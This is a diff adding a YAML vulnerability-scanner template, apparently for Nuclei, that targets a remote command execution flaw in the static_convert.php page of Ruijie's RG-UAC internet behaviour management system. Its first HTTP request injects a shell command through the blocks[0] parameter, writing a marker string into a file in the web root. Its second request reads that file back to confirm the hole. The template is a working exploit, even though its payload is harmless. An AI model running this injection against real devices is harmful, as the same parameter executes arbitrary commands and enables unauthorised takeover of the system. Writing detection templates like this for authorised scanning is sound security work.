@@ -1,0 +1,43 @@
+id: Ruijie_RG-UAC_static_convert_RCE
+
+info:
+  name: Ruijie_RG-UAC_static_convert_RCE
+  author: security-xm
+  severity: high
+  description: 锐捷上网行为管理系统static_convert.php存在远程命令执行漏洞
+  metadata:
+    max-request: 2
+    shodan-query: ""
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||%20%20echo%20'abab'%20>>%20/var/www/html/test.txt%0A HTTP/1.1
+    Host: {{Hostname}}
+    Accept: application/json, text/javascript, */*
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+
+  - |+
+    @timeout: 30s
+    GET /test.txt HTTP/1.1
+    Host: {{Hostname}}
+    Accept: application/json, text/javascript, */*
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - abab
+      condition: and
